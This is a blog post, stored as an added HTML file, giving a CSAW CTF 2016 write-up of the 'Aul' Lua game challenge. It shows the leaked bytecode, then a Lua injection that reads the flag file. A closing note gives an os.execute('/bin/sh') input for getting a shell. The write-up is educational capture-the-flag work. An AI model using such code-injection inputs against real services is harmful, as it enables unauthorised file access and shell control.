@@ -1,0 +1,51 @@
+<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>CSAW CTF 2016: Aul (pwn 100) | Isaac's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives" class="sidebar-nav-item">Archives</a><a href="/about" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>CSAW CTF 2016: Aul (pwn 100)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2016-09-20</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/CSAW-CTF/">CSAW CTF</a>/<a class="post-tag-link" href="/tags/Lua/">Lua</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Wow, this looks like an aul-ful game. I think there is a flag around here somewhere…<br>nc pwn.chal.csaw.io 8001</p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>After connecting to the server, it display some sort of game. The interesting thing is that when we type <code>help</code>, it will print some binary-like data. </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>let&apos;s play a game<br>| 0 0 0 0 0 0 0 0 |<br>| 0 1 0 0 0 0 4 0 |<br>| 0 3 2 2 4 1 4 4 |<br>| 0 3 2 3 2 3 4 3 |<br>| 4 b 2 2 4 4 3 4 |<br>| 3 2 4 4 1 1 2 2 |<br>| 3 3 c d 3 3 2 3 |<br>| 3 2 1 4 4 a 2 4 |<br>help<br>help<br>LuaS�<br><br>xV(w@�,��,�,���,��,�,���,��,�,���CA�$@@C$@�&amp;�<br>                                              make_boardpopulate_boardboard_tostringfallrotatecrush<br>                                                                                                   rotate_lefreadAllhelpquitexit	run_stepgame<br>writelinelet&apos;s play a game<br><br><br>K@J��@@��<br>         AF�@<br>setmetatable�J��@�f&amp;�size<br>            __tostringboard_tostring&quot;<br>                                     .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������<br>@i���A�����h��@d���C�BC���<br>��g��F�C�ef&amp;�sizemath<br>F@G@�������d���F��@�&amp;&amp;�mathrandom$/!K�@�@�@A�����BN�@��(B��A�������݁&apos;�BA�A@�������$B�����@A���AA���&amp;�<br>size| tableinsert |concat<br>1D<br>G@�@@��������N��(���@�$B&apos;���&amp;�size<br>�OCMÂGC�@&apos;��@��&amp;�size            make_board5EN���@�@������������_@@�����������������N����&amp;���������FSG@�@@����������A������΁��N����(B�C�<br>                       make_boardUg<br>$G@�@@��������A�A���@�N����(A����&apos;��OA�N����(A�B�G�GB�@@����@����&apos;��&amp;size<br>                                                                           make_boardabcdik	F@�@�@��ef&amp;�rotatemr<br>                                                                                                                    F@G@����d���������@��@�&amp;�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&amp;�stringsureadAll<br>                                     server.luac	writerawlen&#123;@@�&amp;�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&amp;�<br>                                                                                                                                                                   	readlinestringlenexitfind	functionprintloareturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&amp;�<br>                                                                                                                              populate_board<br>                                                                                                                                            make_board<br>writelineboard_tostring<br>	run_stepquitfallcrushEDidn&apos;t understand. Type &apos;rotate&apos;, &apos;rotate_left&apos;, &apos;exit&apos;, or &apos;help&apos;.<br>Didn&apos;t understand. Type &apos;rotate&apos;, &apos;rotate_left&apos;, &apos;exit&apos;, or &apos;help&apos;.<br></pre></td></tr></table></figure>
+<p>According to its first few bytes <code>Lua</code>, I suppose it is Lua bytecode. However, when I try to decompile or execute the binary, it seems to be corrupted. <a href="https://github.com/ret2libc/ctfs/tree/master/csaw2016/aul" target="_blank" rel="external">This writeup</a> has described how to fix the binary, but during the contest, I just tried entering some function name shown in the binary like <code>game</code> and found that the function will be called. Furthermore, I found that it can actually execute arbitrary Lua function like <code>io.write(&#39;hi&#39;)</code>. I then entering <code>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))</code> to read and print the flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>let&apos;s play a game<br>| 0 0 0 0 0 0 0 0 |<br>| 0 1 0 0 0 0 4 0 |<br>| 0 3 2 2 4 1 4 4 |<br>| 0 3 2 3 2 3 4 3 |<br>| 4 b 2 2 4 4 3 4 |<br>| 3 2 4 4 1 1 2 2 |<br>| 3 3 c d 3 3 2 3 |<br>| 3 2 1 4 4 a 2 4 |<br>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))<br>io.write(io.open(&quot;flag&quot;, &quot;r&quot;):read(&quot;*all&quot;))<br>flag&#123;we_need_a_real_flag_for_this_chal&#125;<br></pre></td></tr></table></figure>
+<p>Yes, I luckily guess the filename <code>flag</code>.</p>
+<blockquote>
+<p>Flag: <code>flag{we_need_a_real_flag_for_this_chal}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Instead of guessing the filename of the flag, using <code>os.execute(&quot;/bin/sh&quot;)</code> can get the shell reliably (<a href="https://galhacktictrendsetters.wordpress.com/2016/09/20/csaw-quals-2016-aul/" target="_blank" rel="external">reference</a>).</p>
+</div><!-- comment system--><div class="container"><hr></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2016 <a href="/" rel="nofollow">Isaac's Blog</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
+    $(".fancybox").fancybox();
+});</script>
+<!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+
+<!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+</body></html>
